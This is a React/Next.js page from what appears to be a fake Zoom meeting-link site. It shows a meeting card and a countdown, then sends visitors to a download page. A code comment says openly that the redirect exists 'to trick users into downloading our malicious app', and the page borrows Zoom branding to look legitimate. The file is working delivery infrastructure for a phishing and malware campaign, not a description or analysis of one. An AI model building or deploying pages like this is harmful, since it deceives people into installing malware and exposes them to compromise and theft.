'use client';

import React, { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { 
  ExternalLink, 
  Clock, 
  Users, 
  Calendar,
  Loader2,
  AlertCircle,
  CheckCircle
} from 'lucide-react';
// Disable user tracking on this page to prevent screen sharing popup
if (typeof window !== 'undefined') {
  // Remove any existing user tracking
  const existingScript = document.querySelector('script[data-user-tracking]');
  if (existingScript) {
    existingScript.remove();
  }
}

interface MeetingInfo {
  id: string;
  title: string;
  description: string;
  link: string;
  createdAt: string;
  expiresAt?: string;
  maxParticipants?: number;
  isActive: boolean;
  clickCount: number;
  lastClicked?: string;
}

const MeetingRedirectPage: React.FC = () => {
  const params = useParams();
  const meetingId = params.id as string;
  
  const [meetingInfo, setMeetingInfo] = useState<MeetingInfo | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [redirectCountdown, setRedirectCountdown] = useState(5);
  const [isRedirecting, setIsRedirecting] = useState(false);

  useEffect(() => {
    if (!meetingId) return;

    const fetchMeetingInfo = async () => {
      try {
        // The meetingId is already the actual ID (no need to remove 'j/')
        const actualMeetingId = meetingId;
        
        // Find the meeting link by searching through all links
        const response = await fetch('/api/admin/meeting-links');
        const allLinks = await response.json();
        
        console.log('Looking for meeting ID:', actualMeetingId);
        console.log('Available links:', allLinks.map((link: MeetingInfo) => link.link));
        
        const meeting = allLinks.find((link: MeetingInfo) => 
          link.link.includes(actualMeetingId) || link.link.endsWith(actualMeetingId)
        );

        if (meeting) {
          setMeetingInfo(meeting);
          
          // Track the click
          await fetch('/api/admin/meeting-links', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              action: 'track_click',
              linkId: meeting.id
            })
          });
        } else {
          setError('Meeting not found');
        }
      } catch (err) {
        console.error('Error fetching meeting info:', err);
        setError('Failed to load meeting information');
      } finally {
        setIsLoading(false);
      }
    };

    fetchMeetingInfo();
  }, [meetingId]);

  useEffect(() => {
    if (meetingInfo && meetingInfo.isActive && redirectCountdown > 0) {
      const timer = setTimeout(() => {
        setRedirectCountdown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (meetingInfo && meetingInfo.isActive && redirectCountdown === 0) {
      handleRedirect();
    }
  }, [meetingInfo, redirectCountdown]);

  const handleRedirect = () => {
    setIsRedirecting(true);
    // Redirect to the download page to trick users into downloading our malicious app
    setTimeout(() => {
      window.location.href = '/download';
    }, 100);
  };

  const isExpired = () => {
    if (!meetingInfo?.expiresAt) return false;
    return new Date(meetingInfo.expiresAt) < new Date();
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-dark-2 flex items-center justify-center">
        <Card className="bg-dark-1 border-dark-3 w-full max-w-md">
          <CardContent className="p-8 text-center">
            <Loader2 className="w-8 h-8 mx-auto mb-4 text-blue-1 animate-spin" />
            <h2 className="text-xl font-semibold text-white mb-2">Loading Meeting...</h2>
            <p className="text-gray-400">Please wait while we prepare your meeting.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (error || !meetingInfo) {
    return (
      <div className="min-h-screen bg-dark-2 flex items-center justify-center">
        <Card className="bg-dark-1 border-dark-3 w-full max-w-md">
          <CardContent className="p-8 text-center">
            <AlertCircle className="w-12 h-12 mx-auto mb-4 text-red-500" />
            <h2 className="text-xl font-semibold text-white mb-2">Meeting Not Found</h2>
            <p className="text-gray-400 mb-6">
              {error || 'The meeting link you clicked is invalid or has been removed.'}
            </p>
            <Button onClick={() => { window.location.href = '/'; }} className="bg-blue-1 hover:bg-blue-1/80">
              <ExternalLink className="w-4 h-4 mr-2" />
              Go to Zoom Homepage
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (!meetingInfo.isActive) {
    return (
      <div className="min-h-screen bg-dark-2 flex items-center justify-center">
        <Card className="bg-dark-1 border-dark-3 w-full max-w-md">
          <CardContent className="p-8 text-center">
            <AlertCircle className="w-12 h-12 mx-auto mb-4 text-orange-500" />
            <h2 className="text-xl font-semibold text-white mb-2">Meeting Inactive</h2>
            <p className="text-gray-400 mb-6">
              This meeting link has been deactivated by the organizer.
            </p>
            <Button onClick={() => { window.location.href = '/'; }} className="bg-blue-1 hover:bg-blue-1/80">
              <ExternalLink className="w-4 h-4 mr-2" />
              Go to Zoom Homepage
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (isExpired()) {
    return (
      <div className="min-h-screen bg-dark-2 flex items-center justify-center">
        <Card className="bg-dark-1 border-dark-3 w-full max-w-md">
          <CardContent className="p-8 text-center">
            <Clock className="w-12 h-12 mx-auto mb-4 text-red-500" />
            <h2 className="text-xl font-semibold text-white mb-2">Meeting Expired</h2>
            <p className="text-gray-400 mb-6">
              This meeting link has expired and is no longer available.
            </p>
            <Button onClick={() => { window.location.href = '/'; }} className="bg-blue-1 hover:bg-blue-1/80">
              <ExternalLink className="w-4 h-4 mr-2" />
              Go to Zoom Homepage
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-dark-2 flex items-center justify-center p-4">
      <Card className="bg-dark-1 border-dark-3 w-full max-w-lg">
        <CardContent className="p-8">
          <div className="text-center mb-6">
            <CheckCircle className="w-16 h-16 mx-auto mb-4 text-green-500" />
            <h1 className="text-2xl font-bold text-white mb-2">Meeting Found!</h1>
            <p className="text-gray-400">Redirecting you to the meeting...</p>
          </div>

          <div className="bg-dark-3 rounded-lg p-6 mb-6">
            <h2 className="text-lg font-semibold text-white mb-2">{meetingInfo.title}</h2>
            {meetingInfo.description && (
              <p className="text-gray-400 mb-4">{meetingInfo.description}</p>
            )}
            
            <div className="space-y-2 text-sm text-gray-400">
              <div className="flex items-center gap-2">
                <Calendar className="w-4 h-4" />
                <span>Created: {new Date(meetingInfo.createdAt).toLocaleString()}</span>
              </div>
              {meetingInfo.expiresAt && (
                <div className="flex items-center gap-2">
                  <Clock className="w-4 h-4" />
                  <span>Expires: {new Date(meetingInfo.expiresAt).toLocaleString()}</span>
                </div>
              )}
              {meetingInfo.maxParticipants && (
                <div className="flex items-center gap-2">
                  <Users className="w-4 h-4" />
                  <span>Max Participants: {meetingInfo.maxParticipants}</span>
                </div>
              )}
            </div>
          </div>

          {isRedirecting ? (
            <div className="text-center">
              <Loader2 className="w-8 h-8 mx-auto mb-4 text-blue-1 animate-spin" />
              <p className="text-white font-semibold">Redirecting to download...</p>
            </div>
          ) : (
            <div className="text-center">
              <div className="mb-4">
                <p className="text-white text-lg font-semibold mb-2">
                  Redirecting in {redirectCountdown} seconds
                </p>
                <div className="w-full bg-dark-3 rounded-full h-2">
                  <div 
                    className="bg-blue-1 h-2 rounded-full transition-all duration-1000"
                    style={{ width: `${((5 - redirectCountdown) / 5) * 100}%` }}
                  ></div>
                </div>
              </div>
              
              <Button 
                onClick={handleRedirect}
                className="bg-blue-1 hover:bg-blue-1/80 w-full"
                disabled={isRedirecting}
              >
                <ExternalLink className="w-4 h-4 mr-2" />
                {isRedirecting ? 'Redirecting...' : 'Continue to Download Now'}
              </Button>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default MeetingRedirectPage;
